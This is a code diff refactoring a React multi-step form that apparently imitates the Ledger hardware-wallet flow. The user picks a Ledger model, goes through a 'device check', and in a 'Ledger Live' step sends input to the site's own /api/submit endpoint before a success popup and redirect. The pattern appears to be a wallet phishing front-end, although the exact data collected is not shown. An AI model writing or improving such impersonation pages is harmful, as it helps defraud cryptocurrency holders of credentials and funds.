@@ -16,12 +16,14 @@ import {
 
 const Form = () => {
   const navigate = useNavigate();
+
   const [selectedImage, setSelectedImage] = useState(null);
   const [currentStep, setCurrentStep] = useState(0);
   const [loading, setLoading] = useState(false);
   const [imageSelected, setImageSelected] = useState(false);
-  const [formData, setFormData] = useState("");
+  const [userInput, setUserInput] = useState("");
   const [showPopup, setShowPopup] = useState(false);
+  const [formData, setFormData] = useState("");
 
   const steps = ["Device Detection", "Device Check", "Ledger Live"];
 
@@ -53,22 +55,29 @@ const Form = () => {
     setShowPopup(false);
   };
 
-  // Step 3 submission - now calls backend
   const handleStep3Submit = async (event) => {
     event.preventDefault();
 
     try {
-     const response = await fetch("/api/submit", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ form_type: "ledger_live", fullname: formData }),
-        });
+      const response = await fetch("/api/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          form_type: "ledger_live",
+          fullname: formData,
+        }),
+      });
 
       const result = await response.json();
 
       if (response.ok) {
         setFormData("");
         setShowPopup(true);
+
+        // Redirect after 2 seconds so user sees popup
+        setTimeout(() => {
+          navigate("/success");
+        }, 2000);
       } else {
         console.error("Error:", result.error);
       }
@@ -79,7 +88,6 @@ const Form = () => {
 
   return (
     <>
-      {/* Timeline */}
       <div className={styles.timeline}>
         {steps.map((step, index) => (
           <div
@@ -104,9 +112,7 @@ const Form = () => {
         ))}
       </div>
 
-      {/* Step content */}
       <div className={styles.step_content}>
-        {/* Step 1 - Device Selection */}
         {currentStep === 0 && (
           <div
             className={`${styles.step_one_content} ${
@@ -119,30 +125,25 @@ const Form = () => {
                 imageSelected ? styles.hidden : ""
               }`}
             >
-              <div data-attribute="Nano S" onClick={() => handleImageSelect(nanos)}>
-                <h3>Nano S</h3>
-                <img src={nanos} alt="Nano S" />
-              </div>
-              <div
-                data-attribute="Nano S Plus"
-                onClick={() => handleImageSelect(nanoplus)}
-              >
-                <h3>Nano S Plus</h3>
-                <img src={nanoplus} alt="Nano S Plus" />
-              </div>
-              <div data-attribute="Nano X" onClick={() => handleImageSelect(nanox)}>
-                <h3>Nano X</h3>
-                <img src={nanox} alt="Nano X" />
-              </div>
-              <div data-attribute="Blue" onClick={() => handleImageSelect(blue)}>
-                <h3>Blue</h3>
-                <img src={blue} alt="Blue" className={styles.last_child} />
-              </div>
+              {[{img: nanos, name:"Nano S"}, {img: nanoplus, name:"Nano S Plus"}, {img: nanox, name:"Nano X"}, {img: blue, name:"Blue"}].map((device) => (
+                <div
+                  key={device.name}
+                  data-attribute={device.name}
+                  onClick={() => handleImageSelect(device.img)}
+                  className={selectedImage === device.img ? styles.selected : ""}
+                >
+                  <h3>{device.name}</h3>
+                  <img
+                    src={device.img}
+                    alt={device.name}
+                    className={device.name === "Blue" ? styles.last_child : ""}
+                  />
+                </div>
+              ))}
             </div>
           </div>
         )}
 
-        {/* Step 2 - Genuine Check */}
         {currentStep === 1 && (
           <div
             className={`${styles.step_two_content} ${
@@ -174,7 +175,6 @@ const Form = () => {
           </div>
         )}
 
-        {/* Step 3 - Ledger Live */}
         {currentStep === 2 && (
           <div className={styles.step_three_content}>
             <div style={{ height: "40px" }} />
@@ -197,7 +197,6 @@ const Form = () => {
         )}
       </div>
 
-      {/* Loader */}
       {loading && (
         <div>
           <div className={styles.loader_content}>
@@ -208,7 +207,6 @@ const Form = () => {
         </div>
       )}
 
-      {/* Popup */}
       {showPopup && (
         <div className={styles.popup}>
           <PiSealCheckFill size={40} color="#bbb0fd" />
